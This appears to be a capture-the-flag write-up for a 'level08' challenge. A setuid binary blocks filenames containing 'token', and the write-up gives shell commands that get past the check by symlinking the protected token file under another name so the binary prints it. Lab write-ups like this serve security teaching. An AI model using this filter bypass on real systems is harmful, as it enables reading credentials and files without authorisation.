Let's check home directory:
``` shell
ls -la
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

After inspecting assembler code of `level08` we find out that this program does following:
1. Get `argv[1]`,
2. Check that it doesn't contain `token` word,
3. Open file with name `argv[1]` and write its content.

The solution is easy.
Let's create a symbolic link to `token` file, so it has another name:
``` shell
ln -s /home/user/level08/token /var/tmp/level08
./level08 /var/tmp/level08
```